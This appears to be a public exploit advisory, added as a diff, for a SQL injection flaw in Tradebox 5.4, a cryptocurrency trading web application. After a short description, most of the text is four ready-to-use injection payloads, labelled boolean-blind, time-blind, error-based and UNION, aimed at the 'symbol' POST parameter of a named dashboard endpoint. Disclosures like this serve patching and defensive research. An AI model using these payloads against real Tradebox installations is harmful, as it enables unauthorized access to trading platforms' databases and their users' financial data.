@@ -1,0 +1,41 @@
+ # Title: Tradebox - CryptoCurrency Buy Sell and Trading
+# Date: 04.04.2019
+# Exploit Author: Abdullah Çelebi
+# Vendor Homepage: https://www.bdtask.com
+# Software Link: tradebox.bdtask.com/demo-v5.3/
+# Version: 5.4
+# Category: Webapps
+# Tested on: WAMPP @Win
+# Software description:
+Tradebox – CryptoCurrency Buy Sell and Trading Software. Tradebox is for
+the cryptocurrency trading and selling.even you can request for buy and
+sell at a specific price. There have withdrawal and deposit option.
+
+# Vulnerabilities:
+# An attacker can access all data following an authorized user login using
+the parameter.
+
+
+# POC - SQLi :
+
+# Parameter: symbol (POST)
+# Request URL: http://localhost/backend/dashboard/home/monthly_deposit
+#    Type : boolean-based blind
+csrf_test_name=53d7718e6ed975d198e33cfcad7def47&symbol=USD' AND 8149=8149
+AND 'PuLt'='PuLt
+
+#    Type : time-based blind
+csrf_test_name=53d7718e6ed975d198e33cfcad7def47&symbol=USD' OR (SELECT *
+FROM (SELECT(SLEEP(5)))rBnp) AND 'wNyS'='wNyS
+
+#    Type : error-based
+csrf_test_name=53d7718e6ed975d198e33cfcad7def47&symbol=USD' AND (SELECT
+5276 FROM(SELECT COUNT(*),CONCAT(0x7162707671,(SELECT
+(ELT(5276=5276,1))),0x7171787171,FLOOR(RAND(0)*2))x FROM
+INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'CnKo'='CnKo
+
+#    Type : generic union
+csrf_test_name=53d7718e6ed975d198e33cfcad7def47&symbol=USD' UNION ALL
+SELECT
+NULL,CONCAT(0x7162707671,0x75664d4466634a4d505554424d6d6a577957506a51534d734c6e7551516f436f71444e77796f4a63,0x7171787171)--
+Lzbq
